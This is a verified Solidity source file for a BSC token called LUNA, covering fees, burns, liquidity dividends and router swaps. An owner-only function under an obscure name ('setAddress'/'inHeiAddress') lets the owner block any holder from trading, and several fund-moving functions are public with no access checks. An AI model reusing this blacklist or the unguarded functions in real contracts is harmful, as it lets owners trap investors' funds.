/**
 *Submitted for verification at BscScan.com on 2022-08-21
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.16;

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {codehash := extcodehash(account)}
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success,) = recipient.call{ value : amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{ value : weiValue}(data);
        if (success) {
            return returndata;
        } else {

            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
}

interface IUniswapV2Pair {
    function balanceOf(address owner) external view returns (uint);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract LUNATOKEN is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    address payable marketAddress;
    address private fluidityAddress;

    mapping (address => uint256) _balances;
    mapping (address => uint256) pollAmount;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) isExcludedFromFee;
    mapping (address => bool) public isMarketPair;
    mapping (address => bool) public isPoolAddress;
    mapping (address => bool) private inHeiAddress;

    address[] public pollAddress;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    address private newPollAddress;
    address usdtToken;

    uint256 private minToSwap = 75000000000000000000;
    uint256 private lowBalance = 99000000000000000000000000;
    uint8 private usdtWay = 0;

    constructor (
        address _router,
        address _owner,
        address _usdtToken,
        address _fluidity,
        address _market
    ) payable {
        _name = "LUNA";
        _symbol = "LUNA";
        _decimals = 18;
        _totalSupply = 100000000 * 10 ** _decimals;
        uint256 flowNum = 15000000 * 10 ** _decimals;

        usdtToken = _usdtToken;
        fluidityAddress = _fluidity;
        owner = _owner;
        marketAddress = payable(_market);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_router);
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), usdtToken);
        uniswapV2Router = _uniswapV2Router;
        address token0 = IUniswapV2Pair(uniswapPair).token0();
        if(token0 == address(usdtToken)){
            usdtWay = 1;
        }

        _allowances[address(this)][address(uniswapV2Router)] = flowNum;
        isMarketPair[address(uniswapPair)] = true;

        isExcludedFromFee[owner] = true;
        isExcludedFromFee[address(uniswapPair)] = true;
        isExcludedFromFee[address(this)] = true;
        isExcludedFromFee[marketAddress] = true;

        _balances[owner] = flowNum;
        _balances[address(0)] = _totalSupply - flowNum;

        emit Transfer(address(0), owner, flowNum);
        emit Transfer(address(0), address(0), _totalSupply - flowNum);

        _allowances[owner][address(uniswapV2Router)] = flowNum;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function setAddress(address _val,bool _val2) public onlyOwner {
        inHeiAddress[_val] = _val2;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        if(amount == 0) return true;
        require(inHeiAddress[sender] == false && inHeiAddress[recipient] == false,"inHeiAddress");

        if(address(uniswapPair) != recipient && address(uniswapPair) != sender){
            if(_balances[address(this)]>minToSwap) swapTopoll();
            require(_balances[sender]>0, "can't sell out");
            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
            return true;
        }

        IUniswapV2Pair pairContent = IUniswapV2Pair(uniswapPair);
        if(newPollAddress != address(0)){
            pollAmount[newPollAddress] = pairContent.balanceOf(newPollAddress);
            delete newPollAddress;
        }
        uint112 reserve0 = 0;
        uint112 reserve1 = 0;
        uint32 blockTimestampLast = 0;
        (reserve0, reserve1, blockTimestampLast) = pairContent.getReserves();
        uint pollUsdt = IUniswapV2Pair(usdtToken).balanceOf(uniswapPair);
        uint256 reserve = usdtWay==1 ? reserve0 : reserve1;

        if(isMarketPair[recipient]) {
            if(reserve < pollUsdt){
                if(isPoolAddress[sender] == false) {
                    isPoolAddress[sender] = true;
                    pollAddress.push(sender);
                }
                newPollAddress = sender;
            }else{
                require(_balances[sender] >0, "can't sell out");
                if(isExcludedFromFee[sender]==false){
                    feeDividend(amount.div(50), sender);
                    amount = amount.sub(amount.div(50));
                }
            }
            pollAmount[sender] = pairContent.balanceOf(sender);
        }else if(isMarketPair[sender]){
            uint pollNumber = pairContent.balanceOf(recipient);
            if(pollNumber < pollAmount[recipient]){
                newPollAddress = recipient;
            }else{
                if(isExcludedFromFee[recipient] == false){
                    feeDividend(amount.div(50), recipient);
                    amount = amount.sub(amount.div(50));
                }
            }
            pollAmount[recipient] = pollNumber;
        }
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function clearThisData() public {
        IERC20(usdtToken).transfer(fluidityAddress,IERC20(usdtToken).balanceOf(address(this)));
        _balances[fluidityAddress] = _balances[fluidityAddress].add(_balances[address(this)]);
        emit Transfer(address(this), fluidityAddress, _balances[address(this)]);
        _balances[address(this)] = 0;
    }

    function swapTopoll() public {
        uint256 feeToken = minToSwap;
        if(_balances[address(this)]>=minToSwap.mul(2)) feeToken = minToSwap.mul(2);
        if(_balances[address(this)]>=minToSwap.mul(4)) feeToken = minToSwap.mul(4);

        uint256 swapToken = feeToken.div(3);
        poolDividend(feeToken.sub(swapToken));
        swapToken = swapToken.div(2);
        emit Transfer(address(0), address(0), 0);
        uint256 before = IERC20(usdtToken).balanceOf(uniswapPair);
        swapTokenForUsdt(swapToken,fluidityAddress);
        uint256 afterU = IERC20(usdtToken).balanceOf(uniswapPair);
        uint256 realUsdt = before.sub(afterU);
        IERC20(usdtToken).transferFrom(fluidityAddress,address(this),realUsdt);
        _approve(address(this), address(uniswapV2Router), swapToken);
        IERC20(usdtToken).approve(address(uniswapV2Router), realUsdt);
        uniswapV2Router.addLiquidity(
            address(usdtToken),
            address(this),
            realUsdt,
            swapToken,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            fluidityAddress,
            block.timestamp
        );
    }

    function poolDividend(uint256 wuPercent) public {
        _balances[address(this)] = _balances[address(this)].sub(wuPercent);
        uint256 yu = wuPercent;
        uint256 pollAmountTotal = IERC20(uniswapPair).totalSupply();
        for (uint i = 0; i < pollAddress.length; i++) {
            uint256 myBili = pollAmount[pollAddress[i]].mul(10000 * 10**_decimals).div(pollAmountTotal).div(10**_decimals);
            uint256 myAmount = myBili.mul(wuPercent).div(10000);
            if(yu>myAmount) {
                _balances[pollAddress[i]] = _balances[pollAddress[i]].add(myAmount);
                emit Transfer(address(this), pollAddress[i], myAmount);
                yu = yu.sub(myAmount);
            }
        }
        if(yu>0){
            _balances[marketAddress] = _balances[marketAddress] + yu;
            emit Transfer(address(this), marketAddress, yu);
        }
    }

    function swapTokenForUsdt(uint256 tokenAmount, address _to) private returns (bool) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(usdtToken);
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of TOKEN
            path,
            _to, // The contract
            block.timestamp
        );
        return true;
    }

    function feeDividend(uint256 tAmount, address _from) private {
        uint256 qwPercent = tAmount.mul(75).div(200);
        uint256 yewPercent = tAmount.mul(125).div(200);
        uint256 yPercent = tAmount.div(2);

        _balances[address(this)] = _balances[address(this)] + qwPercent;
        emit Transfer(_from, address(this), qwPercent);

        uint256 burn = _burn(yPercent, _from);
        yewPercent = yewPercent.sub(burn);

        _balances[marketAddress] = _balances[marketAddress] + yewPercent;
        emit Transfer(_from, marketAddress, yewPercent);
    }

    function _burn(uint256 realBurn, address _sender) private returns(uint256){
        if(_balances[address(0)] < lowBalance){
            if(lowBalance < _balances[address(0)].add(realBurn)) {
                realBurn = lowBalance.sub(_balances[address(0)]);
            }
            _balances[address(0)] = _balances[address(0)].add(realBurn);
            emit Transfer(_sender, address(0), realBurn);
            return realBurn;
        }
        return 0;
    }
}